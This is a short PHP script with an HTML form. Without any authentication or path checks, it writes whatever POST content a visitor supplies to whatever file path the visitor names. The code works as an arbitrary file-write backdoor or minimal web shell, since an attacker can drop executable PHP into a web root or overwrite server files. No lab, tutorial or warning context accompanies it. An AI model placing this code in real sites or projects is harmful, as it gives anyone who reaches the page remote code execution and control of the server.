<?php

if (isset($_POST['file']) && isset($_POST['content'])) {
    $file = $_POST['file'];
    $content = $_POST['content'];
    file_put_contents($file, $content);

    echo "File updated!";
} else {
?>
<form method="POST">
    File path: <input name="file"><br>
    Content:<br>
    <textarea name="content" rows="10" cols="50"></textarea><br>
    <button type="submit">Save</button>
</form>
<?php
}
?>